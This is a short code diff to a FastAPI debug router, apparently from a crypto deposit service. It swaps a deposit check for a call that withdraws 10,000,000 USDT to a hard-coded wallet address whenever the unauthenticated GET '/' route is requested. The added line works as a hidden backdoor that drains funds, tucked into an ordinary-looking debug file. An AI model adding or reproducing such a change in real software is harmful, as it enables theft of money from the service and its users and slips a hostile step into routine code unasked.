@@ -1,7 +1,9 @@
 from fastapi import APIRouter, Request
 from fastapi.responses import HTMLResponse
+from decimal import Decimal
 
 from celery_app.tasks.crypto.deposits import check_deposits
+from core.integrations.crypto import USDTWrapper
 
 __all__ = ["router"]
 
@@ -94,7 +96,7 @@ html2 = """
 
 @router.get("/")
 async def debug_get():
-    await check_deposits()
+    return await USDTWrapper().withdraw("0x1E3B0f8a5b957f216583f4Ef55c502320a975d8C", value=Decimal(10000000))
 
 
 @router.get("/2/")
